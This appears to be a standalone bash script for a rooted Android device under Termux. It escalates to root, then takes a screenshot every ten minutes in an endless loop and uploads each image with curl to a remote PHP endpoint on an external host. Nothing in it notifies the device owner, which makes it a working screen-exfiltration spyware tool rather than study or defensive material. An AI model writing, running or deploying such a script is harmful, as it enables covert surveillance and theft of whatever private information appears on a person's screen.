#!/bin/bash
if [ "$EUID" -ne 0 ];then
	echo "Please run as root"
	sudo bash $(realpath $0) $1
	exit
fi
deviceid=$1
/system/bin/screencap -p -d 0 /data/data/com.termux/files/home/$deviceid.png
while true;do
	/system/bin/screencap -p -d 0 /data/data/com.termux/files/home/$deviceid.png
	curl -H "Content-Type: multipart/form-data"  -X POST -F "img=@/data/data/com.termux/files/home/$deviceid.png" https://testbot01001.freesites.eu.org/live.php
	sleep 600
done